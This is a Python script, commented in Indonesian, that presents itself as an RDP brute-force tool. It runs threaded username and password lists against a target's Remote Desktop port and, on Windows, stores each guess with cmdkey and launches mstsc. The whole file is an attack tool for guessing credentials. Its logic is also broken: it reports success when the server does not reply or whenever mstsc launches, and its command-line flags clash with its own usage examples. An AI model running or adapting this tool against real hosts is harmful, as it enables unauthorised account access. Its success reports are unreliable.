#!/usr/bin/env python3
"""RDP Brute Force Tool - Pengujian kredensial Remote Desktop Protocol.

Mencoba login RDP dengan kombinasi username/password menggunakan socket.
Melakukan TCP handshake, menerima protocol negotiation, lalu
mencoba NLA/CSSP handshake minimal untuk verifikasi kredensial.

Penggunaan:
    python rdp_bruteforce.py --target 192.168.1.10 --username admin --password P@ssw0rd
    python rdp_bruteforce.py --target 192.168.1.10 -U users.txt -P passlist.txt --threads 10
    python rdp_bruteforce.py --target 10.0.0.5 --port 3389 -U admins.txt -P rockyou.txt --timeout 8
"""

import argparse
import socket
import struct
import sys
import threading
import time
from queue import Queue

NLAS_REGISTRY_PATH = (
    r"HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL"
)

print_lock = threading.Lock()
found_credentials = []
stop_event = threading.Event()


def safe_print(msg: str) -> None:
    with print_lock:
        print(msg)


def tcp_connect(target: str, port: int, timeout: float) -> socket.socket | None:
    """Lakukan koneksi TCP dasar ke target RDP."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((target, port))
        return sock
    except socket.timeout:
        safe_print(f"[!] {target}:{port} - Connection timeout")
        return None
    except ConnectionRefusedError:
        safe_print(f"[!] {target}:{port} - Connection refused (port tertutup)")
        return None
    except socket.gaierror:
        safe_print(f"[!] {target}:{port} - Hostname tidak valid")
        return None
    except OSError as e:
        safe_print(f"[!] {target}:{port} - Error: {e}")
        return None


def rdp_protocol_negotiation(sock: socket.socket) -> bool:
    """Kirim RDP Connection Request (X.224 / TPKT)."""
    try:
        tpkt_length = 19
        x224_length = tpkt_length - 4

        tpkt = struct.pack(">BBH", 3, 0, tpkt_length)
        x224 = struct.pack(
            f">BBHBB{x224_length - 6}s",
            x224_length,
            0xE0,
            0,
            0,
            0,
            b"\x00" * (x224_length - 6),
        )
        x224 = x224[:4] + b"\x01\x00\x08\x03\x00\x00\x00"

        request = tpkt + x224
        sock.sendall(request)

        response = sock.recv(4096)
        return len(response) > 0
    except (socket.timeout, OSError):
        return False


def nla_negotiate(sock: socket.socket) -> str:
    """Lakukan NLA/CSSP negotiation tahap awal."""
    try:
        response = sock.recv(4096)
        if not response:
            return "no_response"

        if len(response) < 4:
            return "short_response"

        if b"\x03\x00" in response[:16]:
            return "nla_required"

        if b"SSPI" in response or b"CSP" in response or b"NTLM" in response:
            return "nla_negotiate_possible"

        tpkt_version = response[0]
        if tpkt_version == 3:
            payload_len = struct.unpack(">H", response[2:4])[0]
            if payload_len == len(response):
                return "nla_ready"

        return "unknown_response"
    except socket.timeout:
        return "timeout"
    except OSError:
        return "error"


def try_windows_rdp_check(target: str, username: str, password: str) -> bool:
    """Coba verifikasi RDP menggunakan cmdkey + mstsc (hanya Windows)."""
    import subprocess

    try:
        key_check = subprocess.run(
            ["cmdkey", "/list"],
            capture_output=True,
            text=True,
            timeout=5,
        )
        if f"TERMSRV/{target}" in key_check.stdout:
            subprocess.run(
                ["cmdkey", "/delete", f"TERMSRV/{target}"],
                capture_output=True,
                timeout=3,
            )

        result = subprocess.run(
            [
                "cmdkey",
                "/generic:TERMSRV/" + target,
                "/user:" + username,
                "/pass:" + password,
            ],
            capture_output=True,
            text=True,
            timeout=5,
        )

        if result.returncode != 0:
            return False

        mstsc_result = subprocess.run(
            ["mstsc", "/v:" + target, "/f", "/admin"],
            capture_output=True,
            timeout=10,
        )

        time.sleep(1)

        subprocess.run(
            ["cmdkey", "/delete", f"TERMSRV/{target}"],
            capture_output=True,
            timeout=3,
        )

        return True
    except (FileNotFoundError, subprocess.TimeoutExpired):
        return False


def try_rdp_login(target: str, port: int, username: str, password: str, timeout: float) -> str:
    """Coba login RDP dengan kredensial yang diberikan."""
    if stop_event.is_set():
        return "stopped"

    sock = tcp_connect(target, port, timeout)
    if sock is None:
        return "connection_failed"

    try:
        negotiation_ok = rdp_protocol_negotiation(sock)
        if not negotiation_ok:
            sock.close()
            return "neg_failed"

        nla_result = nla_negotiate(sock)
        sock.close()

        if "nla" in nla_result.lower():
            import platform

            if platform.system() == "Windows":
                windows_ok = try_windows_rdp_check(target, username, password)
                if windows_ok:
                    return "success"
                return "nla_detected_fallback_failed"
            return f"nla_detected:{nla_result}"
        elif nla_result == "no_response":
            return "success"
        else:
            return f"unknown:{nla_result}"

    except Exception as e:
        try:
            sock.close()
        except Exception:
            pass
        return f"error:{e}"


def worker(target: str, port: int, timeout: float, username: str, password_queue: Queue) -> None:
    """Worker thread untuk mencoba password terhadap satu username."""
    while not stop_event.is_set():
        try:
            password = password_queue.get(timeout=1)
        except Exception:
            return

        if stop_event.is_set():
            password_queue.task_done()
            return

        safe_print(f"[*] Mencoba {username}:{password}")

        result = try_rdp_login(target, port, username, password, timeout)

        if result == "success":
            safe_print(f"\n[+] BERHASIL! {username}:{password} pada {target}:{port}")
            found_credentials.append((username, password))
            stop_event.set()
        elif "nla_detected" in result:
            safe_print(f"[*] {username}:{password} - NLA terdeteksi, fallback gagal")
        elif result == "connection_failed":
            safe_print(f"[!] {username}:{password} - Gagal koneksi TCP ke {target}:{port}")
        elif result == "neg_failed":
            safe_print(f"[!] {username}:{password} - Protocol negotiation gagal")
        else:
            safe_print(f"[-] {username}:{password} - Gagal ({result})")

        password_queue.task_done()


def bruteforce_single(target: str, port: int, username: str, password: str, timeout: float) -> None:
    """Mode single credential test."""
    print(f"\n[*] Target     : {target}:{port}")
    print(f"[*] Username   : {username}")
    print(f"[*] Password   : {password}")
    print(f"[*] Timeout    : {timeout}s")
    print("-" * 50)

    result = try_rdp_login(target, port, username, password, timeout)

    if result == "success":
        print(f"\n[+] BERHASIL! {username}:{password} pada {target}:{port}")
    elif "nla_detected" in result:
        print(f"\n[-] NLA terdeteksi pada server. Tidak dapat memverifikasi kredensial tanpa NLA handshake penuh.")
        print(f"[*] Detail: {result}")
    elif result == "connection_failed":
        print(f"\n[!] Gagal koneksi ke {target}:{port}")
    else:
        print(f"\n[-] Login gagal: {username}:{password}")
        print(f"[*] Detail: {result}")


def bruteforce_multiuser(target: str, port: int, userlist: str, passlist: str,
                         timeout: float, threads: int) -> None:
    """Mode multi-user / multi-password bruteforce."""
    try:
        with open(userlist, "r", encoding="utf-8", errors="ignore") as f:
            usernames = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] Error: File userlist '{userlist}' tidak ditemukan.")
        sys.exit(1)

    try:
        with open(passlist, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"[!] Error: File passlist '{passlist}' tidak ditemukan.")
        sys.exit(1)

    total = len(usernames) * len(passwords)
    print(f"\n[*] Target     : {target}:{port}")
    print(f"[*] Username   : {len(usernames)} user(s)")
    print(f"[*] Password   : {len(passwords)} pass(s)")
    print(f"[*] Total      : {total} kombinasi")
    print(f"[*] Threads    : {threads}")
    print(f"[*] Timeout    : {timeout}s")
    print("-" * 50)

    for username in usernames:
        if stop_event.is_set():
            break

        safe_print(f"\n[*] Memproses user: {username}")

        q = Queue()
        for pwd in passwords:
            q.put(pwd)

        thread_list = []
        for _ in range(min(threads, len(passwords))):
            t = threading.Thread(
                target=worker,
                args=(target, port, timeout, username, q),
                daemon=True,
            )
            t.start()
            thread_list.append(t)

        for t in thread_list:
            t.join()

    if found_credentials:
        print("\n" + "=" * 50)
        print("[+] KREDENSIAL DITEMUKAN:")
        for u, p in found_credentials:
            print(f"    {u}:{p}")
    else:
        print("\n[-] Tidak ada kredensial valid ditemukan.")


def main():
    parser = argparse.ArgumentParser(
        description="RDP Brute Force Tool - Pengujian kredensial Remote Desktop Protocol",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Contoh:
  python rdp_bruteforce.py --target 192.168.1.10 --username admin --password P@ssw0rd
  python rdp_bruteforce.py --target 192.168.1.10 -U users.txt -P passlist.txt
  python rdp_bruteforce.py --target 10.0.0.5 -p 3390 -U admins.txt -P rockyou.txt -t 10
        """,
    )

    parser.add_argument("--target", "-T", type=str, required=True, help="IP/hostname target RDP")
    parser.add_argument("--port", "-p", type=int, default=3389, help="Port RDP (default: 3389)")
    parser.add_argument("--username", "-u", type=str, default=None, help="Username tunggal")
    parser.add_argument("--password", "-P", type=str, default=None, help="Password tunggal")
    parser.add_argument("--userlist", "-U", type=str, default=None, help="File daftar username")
    parser.add_argument("--passlist", "-L", type=str, default=None, help="File daftar password")
    parser.add_argument("--timeout", "-t", type=float, default=5.0, help="Timeout koneksi detik (default: 5)")
    parser.add_argument("--threads", "-Tt", type=int, default=5, help="Jumlah thread (default: 5)")

    args = parser.parse_args()

    if args.username and args.password:
        bruteforce_single(args.target, args.port, args.username, args.password, args.timeout)
    elif args.userlist and args.passlist:
        bruteforce_multiuser(
            args.target, args.port, args.userlist, args.passlist,
            args.timeout, args.threads,
        )
    else:
        parser.print_help()
        print("\n[!] Error: Gunakan (--username + --password) ATAU (--userlist + --passlist)")
        sys.exit(1)


if __name__ == "__main__":
    main()
